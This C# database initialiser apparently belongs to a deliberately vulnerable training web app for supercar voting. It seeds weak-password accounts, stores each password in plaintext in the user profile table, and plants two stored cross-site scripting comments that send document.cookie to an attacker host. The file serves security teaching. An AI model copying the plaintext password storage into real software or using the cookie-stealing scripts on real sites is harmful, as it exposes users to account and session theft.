using System;
using System.Data.Entity;
using System.Data.Entity.Infrastructure;
using System.Linq;
using System.Threading;
using System.Web.Mvc;
using Web.Models;
using WebMatrix.WebData;

namespace Web.Filters
{
    [AttributeUsage(AttributeTargets.Class | AttributeTargets.Method, AllowMultiple = false, Inherited = true)]
    public sealed class InitialiseDatabaseAttribute : ActionFilterAttribute
    {
        private static DatabaseInitialiser _initialiser;
        private static object _initializerLock = new object();
        private static bool _isInitialized;

        public override void OnActionExecuting(ActionExecutingContext filterContext)
        {
            // Ensure ASP.NET Simple Membership is initialized only once per app start
            LazyInitializer.EnsureInitialized(ref _initialiser, ref _isInitialized, ref _initializerLock);
        }

        private class DatabaseInitialiser
        {
            public DatabaseInitialiser()
            {
                Database.SetInitializer<SupercarModelContext>(null);

                try
                {
                    var newDb = false;
                    using (var context = new SupercarModelContext())
                    {
                        if (!context.Database.Exists())
                        {
                            // Create the SimpleMembership database without Entity Framework migration schema
                            ((IObjectContextAdapter)context).ObjectContext.CreateDatabase();
                            newDb = true;
                        }
                    }

                    WebSecurity.InitializeDatabaseConnection("DefaultConnection", "UserProfile", "UserId", "Email", true);
                    if (newDb)
                    {
                        PopulateDatabase();
                    }
                }
                catch (Exception ex)
                {
                    throw new InvalidOperationException("The ASP.NET Simple Membership database could not be initialized. For more information, please see http://go.microsoft.com/fwlink/?LinkId=256588", ex);
                }
            }

            private void PopulateDatabase()
            {
                PopulateUserProfiles();
                PopulateMakes();
                PopulateCars();
                PopulateVotes();
            }

            private void PopulateUserProfiles()
            {
                // 23 user accounts
                CreateAccount("troyhunt@hotmail.com", "passw0rd", "Troy", "Hunt");
                CreateAccount("sebastianvettel@f1.com", "sunshine", "Sebastian", "Vettel");
                CreateAccount("kimiraikkonen@f1.com", "iloveyou", "Kimi", "Räikkönen");
                CreateAccount("fernandoalonso@f1.com", "11111111", "Fernando", "Alonso");
                CreateAccount("lewishamilton@f1.com", "thx1138", "Lewis", "Hamilton");
                CreateAccount("felipemassa@f1.com", "rainbow", "Felipe", "Massa");
                CreateAccount("markwebber@f1.com", "gogogo", "Mark", "Webber");
                CreateAccount("romaingrosjean@f1.com", "scorpion", "Romain", "Grosjean");
                CreateAccount("pauldiresta@f1.com", "jordan23", "Paul", "di Resta");
                CreateAccount("nicorosberg@f1.com", "trinity", "Nico", "Rosberg");
                CreateAccount("jensonbutton@f1.com", "wwwww", "Jenson", "Button");
                CreateAccount("sergioperez@f1.com", "america1", "Sergio", "Pérez");
                CreateAccount("danielricciardo@f1.com", "millions", "Daniel", "Ricciardo");
                CreateAccount("adriansutil@f1.com", "ffffffff", "Adrian", "Sutil");
                CreateAccount("nicohulkenberg@f1.com", "sporting", "Nico", "Hülkenberg");
                CreateAccount("jean-ericvergne@f1.com", "vader1", "Jean-Éric", "Vergne");
                CreateAccount("estebangutierrez@f1.com", "qwertzui", "Esteban", "Gutiérrez");
                CreateAccount("valtteribottas@f1.com", "save13tx", "Valtteri", "Bottas");
                CreateAccount("pastormaldonado@f1.com", "frenchie", "Pastor", "Maldonado");
                CreateAccount("julesbianchi@f1.com", "hpk2qc", "Jules", "Bianchi");
                CreateAccount("charlespic@f1.com", "sooners1", "Charles", "Pic");
                CreateAccount("giedovandergarde@f1.com", "pennywise", "Giedo", "van der Garde");
                CreateAccount("maxchilton@f1.com", "qwerty", "Max", "Chilton");
            }

            private void CreateAccount(string email, string password, string firstName, string lastName)
            {
                WebSecurity.CreateUserAndAccount(email, password);
                var db = new SupercarModelContext();
                var userProfile = db.UserProfiles.Single(u => u.Email == email);
                userProfile.FirstName = firstName;
                userProfile.LastName = lastName;
                userProfile.Password = password;
                db.SaveChanges();
            }

            private void PopulateMakes()
            {
                var db = new SupercarModelContext();

                db.Makes.Add(new Make
                {
                    MakeId = 1,
                    Name = "Nissan"
                });

                db.Makes.Add(new Make
                {
                    MakeId = 2,
                    Name = "McLaren"
                });

                db.Makes.Add(new Make
                {
                    MakeId = 3,
                    Name = "Pagani"
                });

                db.Makes.Add(new Make
                {
                    MakeId = 4,
                    Name = "Ferrari"
                });

                db.Makes.Add(new Make
                {
                    MakeId = 5,
                    Name = "Koenigsegg"
                });

                db.Makes.Add(new Make
                {
                    MakeId = 6,
                    Name = "Bugatti"
                });

                db.Makes.Add(new Make
                {
                    MakeId = 7,
                    Name = "Lamborghini"
                });

                db.Makes.Add(new Make
                {
                    MakeId = 8,
                    Name = "Aston Martin"
                });

                db.Makes.Add(new Make
                {
                    MakeId = 9,
                    Name = "Mercedes-Benz"
                });

                db.Makes.Add(new Make
                {
                    MakeId = 10,
                    Name = "Lexus"
                });

                db.SaveChanges();
            }

            private void PopulateCars()
            {
                var db = new SupercarModelContext();

                db.Supercars.Add(new Supercar
                  {
                      SupercarId = 1,
                      MakeId = 1,
                      Model = "GT-R",
                      Description = "The supercar of the PlayStation generation, Nissan’s \"Godzilla\" is one of the most technically advanced supercars of its era and one of the quickest yet around the Nürburgring.",
                      PowerKw = 404,
                      TorqueNm = 628,
                      WeightKg = 1740,
                      ZeroToOneHundredKmInSecs = 2.7,
                      TopSpeedKm = 311,
                      EngineLayout = "Twin-turbo V6",
                      EngineCc = 3799
                  });

                db.Supercars.Add(new Supercar
                  {
                      SupercarId = 2,
                      MakeId = 2,
                      Model = "P1",
                      Description = "McLaren’s mighty P1 looks like becoming the first hypercar to deliver on the elusive \"F1-for-the-road\" promise manufacturers have been making for their fastest cars for more than a quarter century.",
                      PowerKw = 673,
                      TorqueNm = 900,
                      WeightKg = 1400,
                      ZeroToOneHundredKmInSecs = 2.7,
                      TopSpeedKm = 349,
                      EngineLayout = "Twin-turbo V8, electric motor",
                      EngineCc = 3800
                  });

                db.Supercars.Add(new Supercar
                  {
                      SupercarId = 3,
                      MakeId = 3,
                      Model = "Huayra",
                      Description = "Top Gear's \"Hypercar of the year, 2012\", the Huayra is currently the fastest road-legal car ever to go round the Top Gear Test Track, setting a time of 1 minute 13.8 seconds.",
                      PowerKw = 539,
                      TorqueNm = 1000,
                      WeightKg = 1350,
                      ZeroToOneHundredKmInSecs = 3.3,
                      TopSpeedKm = 372,
                      EngineLayout = "Twin-turbo V12",
                      EngineCc = 5980
                  });

                db.Supercars.Add(new Supercar
                  {
                      SupercarId = 4,
                      MakeId = 4,
                      Model = "LaFerrari",
                      Description = "The LaFerrari is the first hybrid from Ferrari, providing the highest power output of any Ferrari whilst decreasing fuel consumption by 40 percent.",
                      PowerKw = 708,
                      TorqueNm = 900,
                      WeightKg = 1255,
                      ZeroToOneHundredKmInSecs = 2.9,
                      TopSpeedKm = 350,
                      EngineLayout = "V12, electric motor",
                      EngineCc = 6262
                  });

                db.Supercars.Add(new Supercar
                  {
                      SupercarId = 5,
                      MakeId = 5,
                      Model = "Agera R",
                      Description = "The Agera R is the result of Koenigsegg's endless pursuit of perfection. The 2013 model features new Aircore hollow carbon fiber wheels, upgraded power and enhanced aerodynamics.",
                      PowerKw = 850,
                      TorqueNm = 1200,
                      WeightKg = 1435,
                      ZeroToOneHundredKmInSecs = 2.8,
                      TopSpeedKm = 440,
                      EngineLayout = "Twin-turbo V8",
                      EngineCc = 4998
                  });

                db.Supercars.Add(new Supercar
                  {
                      SupercarId = 6,
                      MakeId = 6,
                      Model = "Veyron 16.4 Super Sport",
                      Description = "Currently holding the title of the world's fastest production car, the Super Sport features more power and torque and improved aerodynamics over the \"standard\" Veyron",
                      PowerKw = 880,
                      TorqueNm = 1500,
                      WeightKg = 1888,
                      ZeroToOneHundredKmInSecs = 2.5,
                      TopSpeedKm = 431,
                      EngineLayout = "Quad-turbo V16",
                      EngineCc = 7993
                  });

                db.Supercars.Add(new Supercar
                  {
                      SupercarId = 7,
                      MakeId = 7,
                      Model = "Veneno",
                      Description = "The Veneno is a limited production sports car, first exhibited during the 2013 Geneva Motor Show. It's a show piece based on the Aventador and was built to celebrate Lamborghini's 50th anniversary.",
                      PowerKw = 552,
                      TorqueNm = 690,
                      WeightKg = 1450,
                      ZeroToOneHundredKmInSecs = 2.8,
                      TopSpeedKm = 356,
                      EngineLayout = "V12",
                      EngineCc = 6498
                  });

                db.Supercars.Add(new Supercar
                  {
                      SupercarId = 8,
                      MakeId = 8,
                      Model = "One-77",
                      Description = "The One-77 features a full carbon fibre monocoque chassis, a handcrafted aluminium body, and a naturally aspirated 7.3 litre V12 engine.",
                      PowerKw = 560,
                      TorqueNm = 750,
                      WeightKg = 1630,
                      ZeroToOneHundredKmInSecs = 3.5,
                      TopSpeedKm = 354,
                      EngineLayout = "V12",
                      EngineCc = 7312
                  });

                db.Supercars.Add(new Supercar
                  {
                      SupercarId = 9,
                      MakeId = 9,
                      Model = "SLS AMG Black Series",
                      Description = "Simply put, the purest example of driving performance from AMG ever.",
                      PowerKw = 464,
                      TorqueNm = 635,
                      WeightKg = 1550,
                      ZeroToOneHundredKmInSecs = 3.6,
                      TopSpeedKm = 315,
                      EngineLayout = "V8",
                      EngineCc = 6208
                  });

                db.Supercars.Add(new Supercar
                  {
                      SupercarId = 10,
                      MakeId = 10,
                      Model = "LFA Nürburgring",
                      Description = "The LFA Nürburgring Package is a competition-focused variant of the LFA with a limited run of 50 vehicles to be included in the 500 unit LFA build cycle.",
                      PowerKw = 425,
                      TorqueNm = 650,
                      WeightKg = 1562,
                      ZeroToOneHundredKmInSecs = 3.7,
                      TopSpeedKm = 338,
                      EngineLayout = "V10",
                      EngineCc = 4805
                  });

                db.SaveChanges();
            }

            private void PopulateVotes()
            {
                var db = new SupercarModelContext();

                db.Votes.Add(new Vote
                {
                    UserId = 1,
                    SupercarId = 1,
                    Comments = "Time to put one of these in the garage!"
                });

                db.Votes.Add(new Vote
                {
                    UserId = 2,
                    SupercarId = 1
                });

                db.Votes.Add(new Vote
                {
                    UserId = 5,
                    SupercarId = 2,
                    Comments = "Bugger, I'd have one of these if I'd stuck around"
                });

                db.Votes.Add(new Vote
                {
                    UserId = 11,
                    SupercarId = 2,
                    Comments = "I've got one :)"
                });

                db.Votes.Add(new Vote
                {
                    UserId = 17,
                    SupercarId = 3,
                    Comments = "Is this for real?!"
                });

                db.Votes.Add(new Vote
                {
                    UserId = 3,
                    SupercarId = 4,
                    Comments = "<script>document.write(\"<img src='http://attacker.hackyourselffirst.troyhunt.com/Images/Lotus.png?c=\" + document.cookie + \"'>\");</script>"
                });

                db.Votes.Add(new Vote
                {
                    UserId = 22,
                    SupercarId = 6,
                    Comments = "<script>location.href=\"http://attacker.hackyourselffirst.troyhunt.com/Cookies/?c=\"+encodeURIComponent(document.cookie);</script>"
                });

                db.Votes.Add(new Vote
                {
                    UserId = 22,
                    SupercarId = 5,
                    Comments = "Whoa - this thing is faster than my work car!"
                });

                db.Votes.Add(new Vote
                {
                    UserId = 14,
                    SupercarId = 5,
                    Comments = "Yeah, I've seen the way you drive :P"
                });

                db.Votes.Add(new Vote
                {
                    UserId = 7,
                    SupercarId = 1
                });

                db.Votes.Add(new Vote
                {
                    UserId = 7,
                    SupercarId = 2
                });

                db.Votes.Add(new Vote
                {
                    UserId = 12,
                    SupercarId = 1
                });

                db.Votes.Add(new Vote
                {
                    UserId = 5,
                    SupercarId = 3
                });

                db.Votes.Add(new Vote
                {
                    UserId = 7,
                    SupercarId = 3
                });

                db.Votes.Add(new Vote
                {
                    UserId = 5,
                    SupercarId = 9,
                    Comments = "This ->"
                });

                db.Votes.Add(new Vote
                {
                    UserId = 10,
                    SupercarId = 9,
                    Comments = "Yep, yellow one please!"
                });

                db.Votes.Add(new Vote
                {
                    UserId = 22,
                    SupercarId = 7,
                    Comments = "Beauty is in the eye of the beholder, right?!?!"
                });

                db.Votes.Add(new Vote
                {
                    UserId = 21,
                    SupercarId = 8
                });

                db.SaveChanges();
            }
        }
    }
}
